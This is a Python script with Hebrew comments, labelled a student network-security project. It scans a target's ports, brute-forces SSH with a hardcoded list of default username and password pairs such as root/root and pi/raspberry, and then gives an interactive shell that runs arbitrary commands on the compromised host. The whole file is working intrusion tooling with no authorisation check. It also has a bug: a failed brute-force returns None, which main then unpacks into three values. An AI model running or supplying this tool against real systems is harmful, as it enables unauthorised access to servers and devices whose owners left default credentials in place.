
import subprocess
import socket
import paramiko
import platform
import sys
import time
import threading

# רשימת פרטי התחברות נפוצים לברוט פורס
COMMON_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "1234"),
    ("root", "123456"),
    ("user", "user"),
    ("test", "test"),
    ("guest", "guest"),
    ("pi", "raspberry"),
    ("kali", "kali"),
]


def show_progress_bar(current, total, prefix="", suffix="", length=30):
    """
    מציג פס התקדמות גרפי במהלך סריקה
    """
    percent = (current / total) * 100
    filled = int(length * current // total)
    bar = '#' * filled + '-' * (length - filled)

    sys.stdout.write(f'\r{prefix} [{bar}] {percent:.1f}% {suffix}')
    sys.stdout.flush()

    if current == total:
        print()


def check_connection(target):
    """
    בודק אם היעד זמין ברשת באמצעות ping
    """
    os_type = platform.system()

    if os_type == "Windows":
        command = ["ping", "-n", "1", target]
    else:
        command = ["ping", "-c", "1", target]

    try:
        result = subprocess.run(command,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                timeout=5)
        return result.returncode == 0
    except:
        return False


def scan_single_port(target, port, timeout=0.5):
    """
    סורק פורט בודד ומחזיר אם הוא פתוח
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    try:
        result = sock.connect_ex((target, port))
        return result == 0
    except:
        return False
    finally:
        sock.close()


def scan_ports_range(target, start_port, end_port):
    """
    סורק טווח פורטים ומציג פס התקדמות
    """
    open_ports = []
    total_ports = end_port - start_port + 1

    print(f"\nמתחיל סריקה של {total_ports} פורטים...")

    for i, port in enumerate(range(start_port, end_port + 1), 1):
        if scan_single_port(target, port):
            open_ports.append(port)
            print(f"  מצאתי פורט פתוח: {port}")

        # הצגת פס התקדמות כל 100 פורטים
        if i % 100 == 0 or i == total_ports:
            show_progress_bar(i, total_ports, "סריקת פורטים")

    return sorted(open_ports)


def quick_scan(target):
    """
    סריקה מהירה של פורטים נפוצים בלבד
    """
    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389, 8080
    ]

    open_ports = []
    print("מבצע סריקה מהירה של פורטים נפוצים...")

    for i, port in enumerate(common_ports, 1):
        if scan_single_port(target, port, timeout=1):
            open_ports.append(port)
            print(f"  פורט {port}: פתוח")
        else:
            print(f"  פורט {port}: סגור")

        show_progress_bar(i, len(common_ports), "סריקה מהירה")

    return open_ports


def brute_force_ssh(target, port=22):
    """
    מבצע ניסיונות התחברות מרובים ל-SSH עם פרטים נפוצים
    """
    print(f"\nמתחיל ניסיונות התחברות ל-SSH...")
    print(f"יעד: {target}:{port}")
    print(f"מספר ניסיונות: {len(COMMON_CREDENTIALS)}")
    print("-" * 40)

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for i, (username, password) in enumerate(COMMON_CREDENTIALS, 1):
        show_progress_bar(i, len(COMMON_CREDENTIALS),
                          "ניסיונות התחברות",
                          f"מנסה: {username}")

        try:
            ssh_client.connect(target,
                               port=port,
                               username=username,
                               password=password,
                               timeout=0.5)

            print(f"\nהתחברות הצליחה!")
            print(f"פרטי התחברות: {username}:{password}")
            return ssh_client, username, password

        except paramiko.AuthenticationException:
            continue
        except:
            continue

    time.sleep(0.5)

    print("\nלא הצלחנו להתחבר עם אף אחד מהפרטים הנפוצים")
    ssh_client.close()
    return None


def manual_ssh_login(target, port=22):
    """
    מאפשר למשתמש להכניס פרטי SSH ידנית
    """
    print("\nהתחברות SSH ידנית")

    attempts = 0
    max_attempts = 3

    while attempts < max_attempts:
        print(f"\nנסיון {attempts + 1}/{max_attempts}")
        username = input("שם משתמש: ").strip()
        password = input("סיסמה: ").strip()

        if not username or not password:
            print("שם משתמש וסיסמה הם שדות חובה")
            attempts += 1
            continue

        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            ssh_client.connect(target,
                               port=port,
                               username=username,
                               password=password,
                               timeout=0.5)

            print("התחברות הצליחה!")
            return ssh_client, username, password

        except paramiko.AuthenticationException:
            print("סיסמה שגויה")
        except Exception as e:
            print(f"שגיאת חיבור: {e}")

        attempts += 1

    print("חצית את מספר הנסיונות המותר")
    return None


def run_ssh_commands(ssh_client, username, target):
    """
    מאפשר הרצת פקודות דרך SSH
    """
    print(f"\nמחובר כ-{username}@{target}")
    print("הקלד 'exit' לצאת, 'help' לעזרה")

    while True:
        try:
            command = input(f"{username}@{target}$ ").strip()

            if command.lower() == "exit":
                print("יוצא מממשק SSH...")
                break
            elif command.lower() == "help":
                print("פקודות זמינות:")
                print("  whoami - הצג משתמש נוכחי")
                print("  pwd - הצג תיקייה נוכחית")
                print("  ls - רשום קבצים")
                print("  exit - יציאה")
                continue
            elif not command:
                continue

            stdin, stdout, stderr = ssh_client.exec_command(command)
            output = stdout.read().decode()
            errors = stderr.read().decode()

            if output:
                print(output)
            if errors:
                print("שגיאות:")
                print(errors)

        except KeyboardInterrupt:
            print("\nהתוכנית הופסקה")
            break
        except Exception as e:
            print(f"שגיאה: {e}")

    ssh_client.close()
    print("חיבור SSH נסגר")


def get_scan_range():
    """
    מבקש מהמשתמש את טווח הסריקה
    """
    print("\nאפשרויות סריקה:")
    print("1. סריקה מהירה (פורטים נפוצים)")
    print("2. סריקה מלאה (כל הפורטים)")
    print("3. טווח מותאם אישית")

    while True:
        choice = input("\nבחר אפשרות (1-3): ").strip()

        if choice == "1":
            return "quick"
        elif choice == "2":
            return 1, 65535
        elif choice == "3":
            try:
                start = int(input("פורט התחלה: "))
                end = int(input("פורט סיום: "))

                if 1 <= start <= 65535 and 1 <= end <= 65535 and start <= end:
                    return start, end
                else:
                    print("פורטים חייבים להיות בין 1 ל-65535")
            except ValueError:
                print("נא להזין מספרים בלבד")
        else:
            print("אפשרות לא חוקית")


def main():
    """
    הפונקציה הראשית של התוכנית
    """
    print("=" * 50)
    print("סורק רשת - פרויקט אבטחת מידע")
    print("=" * 50)

    # קבלת כתובת היעד
    target = input("\nהזן כתובת IP או שם דומיין: ").strip()

    if not target:
        print("לא הוזנה כתובת")
        return

    # בדיקת חיות
    print(f"\nבודק חיבור ל-{target}...")
    if check_connection(target):
        print("היעד זמין")
    else:
        print("היעד לא מגיב לפינג")
        choice = input("להמשיך בכל זאת? (y/n): ")
        if choice.lower() != 'y':
            return

    # קביעת טווח סריקה
    scan_range = get_scan_range()

    # ביצוע סריקה
    if scan_range == "quick":
        open_ports = quick_scan(target)
    else:
        start, end = scan_range
        open_ports = scan_ports_range(target, start, end)

    # הצגת תוצאות
    print(f"\nתוצאות סריקה:")
    print("-" * 30)

    if open_ports:
        print(f"נמצאו {len(open_ports)} פורטים פתוחים:")
        for port in open_ports:
            if port == 22:
                print(f"  {port} - SSH")
            elif port == 80:
                print(f"  {port} - HTTP")
            elif port == 443:
                print(f"  {port} - HTTPS")
            else:
                print(f"  {port}")
    else:
        print("לא נמצאו פורטים פתוחים")

    # בדיקת SSH
    ssh_port = None
    ssh_ports = [22, 2222, 222]

    for port in ssh_ports:
        if port in open_ports:
            ssh_port = port
            break

    if ssh_port:
        print(f"\nנמצא SSH על פורט {ssh_port}")

        print("\nאפשרויות התחברות:")
        print("1. ניסיון התחברות עם פרטים נפוצים")
        print("2. התחברות ידנית")
        print("3. דלג על SSH")

        choice = input("\nבחר אפשרות (1-3): ").strip()

        if choice == "1":
            ssh_client, username, password = brute_force_ssh(target, ssh_port)
            if ssh_client:
                run_ssh_commands(ssh_client, username, target)

        elif choice == "2":
            ssh_client, username, password = manual_ssh_login(target, ssh_port)
            if ssh_client:
                run_ssh_commands(ssh_client, username, target)

    print("\nסיום התוכנית")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nהתוכנית הופסקה")
    except Exception as e:
        print(f"\nשגיאה: {e}")